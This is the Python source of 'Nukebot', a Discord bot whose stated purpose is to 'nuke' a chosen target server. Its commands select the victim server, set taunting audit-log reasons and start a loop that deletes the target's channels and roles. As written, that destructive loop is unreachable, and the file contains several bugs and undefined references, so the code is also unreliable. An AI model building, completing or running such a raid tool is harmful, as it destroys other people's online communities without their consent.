from os import getenv, execv
from subprocess import run
import platform
import asyncio
from sys import argv, executable
try:
    def dep_installer():
        from assets.install_deps import Dependencies
        Dependencies.install()
    known_opts = {"--install-dependencies":dep_installer}
    known_opts[argv[1]]()
except IndexError:
    pass
except KeyError:
    print(f"Unknown option for Nukebot: '{argv[1]}'")
    print(f"Ignoring and continuing to launch Nukebot.")

import json
def del_pair(key: str):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
    try:
        del data[key]
        with open("conf.json", "w+") as jsonfile:
            myJSON = json.dump(data, jsonfile, indent=2)
            jsonfile.close()
    except KeyError:
        return

def mod_config(key: str, value):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        
    data[key] = value
    with open("conf.json", "w+") as jsonfile:
        myJSON = json.dump(data, jsonfile, indent=2)
        jsonfile.close()

def get_var(key: str):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        try:
            val = data[key]
            return val
        except KeyError:
            return None

if get_var('Not Setup Yet!'):
    from assets.install_deps import Dependencies
    Dependencies.install()

import disnake
from disnake.ext import commands
from dotenv import load_dotenv
from os import getenv
from disnake.ext.commands import NotOwner,MemberNotFound,RoleNotFound,MessageNotFound,CommandInvokeError,MissingRequiredArgument,MissingPermissions,CommandOnCooldown,CommandNotFound,UserNotFound
from asyncio import TimeoutError
from time import mktime
from colorama import init, Fore
from datetime import datetime

init()

def logo():
    return disnake.File('assets/images/NukebotLogo.png')

class bolds:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

load_dotenv(".env")
token = getenv("token")
if token is None:
    token_from_input = input("Bot's token> ")
    f = open(".env", "w+")
    f.write(f"token={token_from_input}")
    f.close()
    load_dotenv(".env")

bot = commands.InteractionBot()

class mk_q(disnake.ui.View):
    def __init__(self, bot: commands.InteractionBot, amount: int):
        self.bot = bot
        self.amount = amount
        super().__init__(timeout=None)
    
    @disnake.ui.button(label='Start writing the questions', custom_id=f"answer_questions_page1", style=disnake.ButtonStyle.blurple)
    async def letsgoow(self, button: disnake.ui.Button, i: disnake.MessageInteraction):
        await i.response.send_message(embed=disnake.Embed(title=f"Leeet's Gooooooooooowww", description=f"Let's go let's go let's go!!!!"))

class startmk_q(disnake.ui.View):
    def __init__(self, bot: commands.InteractionBot, howmanyleft: int):
        self.bot = bot
        self.howmanyleft = howmanyleft
        super().__init__(timeout=None)
    
    @disnake.ui.button(label='Continue', custom_id=f"randomn", style=disnake.ButtonStyle.blurple)
    async def claim_daily_all_ghostos(self, button: disnake.ui.Button, i: disnake.MessageInteraction):
        await i.response.send_message(embed=disnake.Embed(title=f"Leeet's Gooooooooooowww", description=f"{self.howmanyleft} more to go! Let's gowwww!"))

class mk_questions(disnake.ui.Modal):
    def __init__(self, bot: commands.InteractionBot, amount: int):
        self.amount = amount
        self.bot = bot
        comps: list[disnake.Component] = []
        while len(comps) < amount and len(comps) < 5:
            comp = disnake.ui.TextInput(
                label=f'QUESTION {amount}', custom_id=f'Q{amount}', style=disnake.TextInputStyle.multi_line, placeholder=f'Type a question', required=True
            )
            comps.append()
            amount -= 1
        super().__init__(title="Set up questions", custom_id="questions_page1", components=comps)

    async def on_error(self, error: Exception, i: disnake.ModalInteraction) -> None:
        await i.response.send_message(embed=disnake.Embed(title=f"Something went wrong", description=f"```{str(error.with_traceback())}```", color=disnake.Colour.red()))

    async def callback(self, i: disnake.ModalInteraction):
        await i.response.send_message(embed=disnake.Embed(title=f"Great, results below!", description=f"**Amount of questions we need to write**\n`{self.amount}`\n\n**Written in the previous Modal**\n`{len(i.data._components)}`", color=disnake.Colour.green()), view=startmk_q(self.bot, self.amount))


class select_home_guild(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers", custom_id="select_home_server", options=Found_Guilds_Selects_Options)

class make_home_guild_select_view(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(select_home_guild())

class guildselects(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers to nuke", custom_id="member_of_servers", options=Found_Guilds_Selects_Options)

class adddrop_ls_servers(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(guildselects())

class Config:
    role_del_audit = None
    channel_del_audit = None
    members_punish_audit = None
    target_server = None
    home_server = None

__target_serverid = get_var('target_server')
__home_serverid = [get_var('home_server')]
print(__home_serverid)
if str(__home_serverid) == '[None]':
    __home_serverid = [1, 2, 3]
print
class Functs:
    def guild_found():
        guild = bot.get_guild(__target_serverid)
        if guild is None:
            return False
        elif guild is not None:
            return guild

    def get_own_roles():
        guild = Functs.guild_found()
        if not guild:
            return None
        own_roles: list[disnake.Role] = []
        for role in guild.me.roles:
            own_roles.append(role)
        return own_roles

    def perms_for_role(roles: list[disnake.Role]):
        roles_and_their_perms = {}
        for role in roles:
            roles[str(role.id)] = role.permissions
        
        print(roles_and_their_perms)
        return roles_and_their_perms

optionss = commands.option_enum(
    ["Change text that will appear on audit logs for role deletions", 
    "Change text that will appear on audit logs for channel deletions",
    "Change text that will appear on audit logs for member punishments (ban, kick, etc)",
    "Change target server",
    "Change home server",
    "Setup questions",
    ]
    )
@bot.slash_command(guild_ids=__home_serverid)
@commands.is_owner()
async def configure(i: disnake.ApplicationCommandInteraction, option: optionss = commands.Param(description="Choose an option to set / change")):
    """Configure Nukebot."""
    if str(option) == "Change text that will appear on audit logs for role deletions":
        await i.response.send_modal(
            modal=disnake.ui.Modal(
                title=f"Text on audit logs for role deletions", 
                components=[
                    disnake.ui.TextInput(
                        label="📜 text",
                        placeholder="Example: Your roles suck! or... Too many roles lol get it cleaned!",
                        custom_id="audit_rol_dels",style=disnake.TextInputStyle.paragraph,max_length=50
                        )
                    ],
                custom_id="modal_audit_rol_dels",
                timeout=600
            )
        )
        return
    if option == "Change text that will appear on audit logs for channel deletions":
        await i.response.send_modal(
            modal=disnake.ui.Modal(
                title=f"Text on audit logs for channel deletions", 
                components=[
                    disnake.ui.TextInput(
                        label="📜 text",
                        placeholder="Example: Your channels suck! or... Too many channels lol get it cleaned!",
                        custom_id="audit_chan_dels",style=disnake.TextInputStyle.paragraph,max_length=50
                        )
                    ],
                custom_id="modal_audit_chan_dels",
                timeout=600
            )
        )
        return
        results = mod_config('channel_del_audit', f"{msg.content}")
        if results == "set_key_in_default":
            await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs", color=disnake.Colour.green()).set_thumbnail(file=logo()))
            return
    if option == "Change text that will appear on audit logs for member punishments (ban, kick, etc)":
        m = await i.send(content=f"> ✅ **Changing text that will appear on their audit logs for member nuke actions (i.e. ban, kick)**\nWhat shall be the text? *(Please type now)*")
        try:
            msg: disnake.Message = await bot.wait_for('message', check=lambda m: m.author.id == i.author.id and m.channel.id == i.channel.id, timeout=60)
        except TimeoutError:
            await i.send(embed=disnake.Embed(description=f"> ⏱️ Timed out. Retry.", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            await m.edit(content=f"> ~~✅ **Changing text that will appear on their audit logs for member nuke actions**\nWhat shall be the text? *(TIMED OUT!)*~~")
            return
        results = mod_config('members_punish_audit', f"{msg.content}")
        if results == "set_key_in_default":
            await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs", color=disnake.Colour.green()).set_thumbnail(file=logo()))
            return
    if option == "Change target server":
        m = await i.send(content=f"> ✅ **Specifying target server**", view=adddrop_ls_servers())
        return
    if option == "Change home server":
        await i.send(embed=disnake.Embed(title=f"Please specify your home/own server", color=0xF6F908, timestamp=datetime.now()).set_thumbnail(file=logo()), view=make_home_guild_select_view())
        return
    if option == "Setup questions":
        await i.response.send_modal(
            disnake.ui.Modal(
                title="Questions • Setup", 
                components=[
                    disnake.ui.TextInput(label=f"Question", placeholder="How many questions would you like to create? Max 5 questions per popup/page", required=False, style=disnake.TextInputStyle.short, custom_id='amount_of_questions'),
                ], 
                custom_id='setup_questions'
            )
        )
@bot.slash_command(guild_ids=__home_serverid)
async def permissions_for(i: disnake.ApplicationCommandInteraction):
    """"""

@bot.slash_command(guild_ids=__home_serverid)
@commands.is_owner()
async def start(i: disnake.ApplicationCommandInteraction):
    guild_id = get_var('target_server')
    homeserver = get_var('home_server')
    if guild_id is None:
        await i.send(embed=disnake.Embed(description=f"> Configure Nuke bot first with the ` /setup ` command", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return
    g = bot.get_guild(int(guild_id))
    if homeserver == guild_id:
        await i.send(embed=disnake.Embed(description=f"> This is suicide! You specified your home server as your target server!\n\n**Change your target_server, please.**", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return
    if i.guild.id == guild_id:
        await i.send(embed=disnake.Embed(description=f"> Are you insane? Do it in your own server remotely!\n\n**You wouldn't want to be in the nuclear fallout! :", color=disnake.Colour.red()).set_thumbnail(file=logo()))

    return

    for channel in g.channels:
        try:
            await channel.delete(reason=Config.channel_del_reason)
        except:
            pass

    for role in g.roles:
        try:
            await role.delete(reason=Config.role_del_reason)
        except:
            pass

@bot.message_command(name=f"Delete this message", dm_permission=True, guild_ids=[])
async def delete_message(i: disnake.ApplicationCommandInteraction):
    await i.data.target.delete()
    await i.response.defer()
    await i.send(content=f"** **")
    await i.delete_original_message()

@bot.event
async def on_ready():
    if len(bot.guilds) == 0:
        print(f"{bolds.RED}Hey! Hey!{bolds.END}{Fore.WHITE} Throw me at least in 1 server!")
        quit()
    if get_var('Not Setup Yet!'):
        dm_conv = await bot.owner.create_dm()
        await dm_conv.send(embed=disnake.Embed(title=f"💥 Welcome to Nukebot! ☢️ :D", description=f"To continue, please **specify the following**\n> **`Select your home server`**", color=0xF6F908, timestamp=datetime.now()).set_author(name=f"Hello, {bot.owner.display_name}").set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server").set_thumbnail(file=logo()), view=make_home_guild_select_view())

    dm_conv = await bot.owner.create_dm()
    await dm_conv.send(
        embed=disnake.Embed(
            title=f"🍑 Welcome to AssBot 💦", 
            description=f"To continue, please\n> **`Answer some questions`**", 
            color=0xF6F908, 
            timestamp=datetime.now())
            .set_author(name=f"Hello, {bot.owner.display_name}")
            .set_footer(text=f"Made with ❤️")
            .set_thumbnail(url=bot.user.display_avatar), components=disnake.ui.Button(style=disnake.ButtonStyle.grey, label=f"Begin", custom_id='answer_questions_page1')
        )
    def win_clear():
        run("cls", shell=True)

    def lin_clear():
        run(["clear"])

    doPlatformRespectiveCMD = {
        'Windows':win_clear,
        'Linux':lin_clear,
    }
    doPlatformRespectiveCMD[platform.system()]()
    print(f"""{bolds.YELLOW}
☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ 
☢ {bolds.RED} _   _       _        ____        _   {bolds.YELLOW}☢
☢ {bolds.RED}| \ | |     | |      |  _ \      | |  {bolds.YELLOW}☢
☢ {bolds.RED}|  \| |_   _| | _____| |_) | ___ | |_ {bolds.YELLOW}☢
☢ {bolds.RED}| . ` | | | | |/ / _ \  _ < / _ \| __|{bolds.YELLOW}☢
☢ {bolds.RED}| |\  | |_| |   <  __/ |_) | (_) | |_ {bolds.YELLOW}☢
☢ {bolds.RED}|_| \_|\__,_|_|\_\___|____/ \___/ \__|{bolds.YELLOW}☢
☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ ☢ """ + f"\n{bolds.CYAN}By Karma / Dr-Insanity (On Github)" + f"\n{bolds.GREEN}Keep this open.\nAll good on this side.\nPlease go to Discord now.")

@bot.event
async def on_slash_command_error(i: disnake.ApplicationCommandInteraction, error):
    if isinstance(error, NotOwner):
        await i.send(embed=disnake.Embed(description=f">>> This bot should only be operated by it's owner, which is **{bot.owner}** or {bot.owner.mention}", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return
    raise error

@bot.event
async def on_modal_submit(i: disnake.ModalInteraction):
    value = i.data._components[0].children[0].value
    if i.data.custom_id == "setup_questions":
        try:
            int(value)
            await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` Is the amount of questions people will be asked", color=disnake.Colour.green()).set_thumbnail(file=logo()), view=mk_q(bot, str(value)))
            return
        except ValueError:
            await i.send(embed=disnake.Embed(title=f"❌ Ah ain't gonna work, boss. :(", description=f"` {value} ` Is not a number (NaN)", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            return
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs", color=disnake.Colour.green()).set_thumbnail(file=logo()))
        return
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs", color=disnake.Colour.green()).set_thumbnail(file=logo()))
        return
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs", color=disnake.Colour.green()).set_thumbnail(file=logo()))
        return
    if i.data.custom_id == "questions_page1":
        plchldr1 = i.data._components[0].children[0].placeholder
        plchldr2 = i.data._components[0].children[0].placeholder
        plchldr3 = i.data._components[0].children[0].placeholder
        plchldr4 = i.data._components[0].children[0].placeholder
        plchldr5 = i.data._components[0].children[0].placeholder
        QandA = {}
        for key, val in i.text_values:
            if key == "Q1":
                QandA[plchldr1] = val
            if key == "Q2":
                QandA[plchldr2] = val
            if key == "Q3":
                QandA[plchldr3] = val
            if key == "Q4":
                QandA[plchldr4] = val
            if key == "Q5":
                QandA[plchldr5] = val

        await i.response.send_modal(mk_questions())

@bot.event
async def on_dropdown(i: disnake.MessageInteraction):
    """"""
    if i.data.custom_id == "member_of_servers":
        g = bot.get_guild(int(i.data.values[0]))
        if g is None:
            await i.response.send_message(embed=disnake.Embed(description=f">>> Could not find target server! :/\nHint: `Am I still in there?`", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            return
        g_owner = await g.getch_member(g.owner_id)
        await i.response.edit_message(content=f"> ✅ **Updated your target server!**",
            embed=disnake.Embed(
                description=f"Updated your target server!", 
                color=disnake.Colour.green()).add_field(
                    name="Name", value=f"` {g.name} `", inline=False).add_field(
                    name="ID", value=f"` {g.id} `", inline=False).add_field(
                    name="Total members (including bots)", value=f"` {g.member_count} `", inline=False).add_field(
                    name="Created", value=f"<t:{int(mktime(g.created_at.timetuple()))}:R>", inline=False).add_field(
                    name="Description", value=f"` {g.description} `", inline=False).add_field(
                    name="Owner", value=f"` {g.owner_id} ` / ` {g_owner} ` / {g_owner.mention}", inline=False),
        components=disnake.ui.Select(placeholder=f"Updated your target server!", min_values=1, max_values=1, options=[disnake.SelectOption(label=f"disabled", value=f"Mark Rutte lol", description=f"Kan opkutte")], disabled=True))
        mod_config('target_server', int(i.data.values[0]))

    if i.data.custom_id == "select_home_server":
        g = bot.get_guild(int(i.data.values[0]))
        if g is None:
            await i.response.send_message(embed=disnake.Embed(description=f">>> Could not find target server! :/\nHint: `Am I still in there?`", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            return
        await i.response.edit_message(embeds=[disnake.Embed(title=f"💥 Welcome to Nukebot! ☢️ :D", description=f"To continue, please **specify the following**\n> ` ✅ ` **You selected {g.name}**", color=0xF6F908, timestamp=datetime.now()).set_author(name=f"Hello, {bot.owner.display_name}").set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server").set_thumbnail(file=logo()), disnake.Embed(title=f"Success!", description=f">>> {g.name} will now be the only server you are supposed to use commands on. Happy nuking! 💥", color=disnake.Color.green()).set_thumbnail(file=logo())], view=None)
        mod_config('home_server', g.id)
        del_pair('Not Setup Yet!')

try:    
    bot.run(token)
except KeyboardInterrupt:
    quit(0)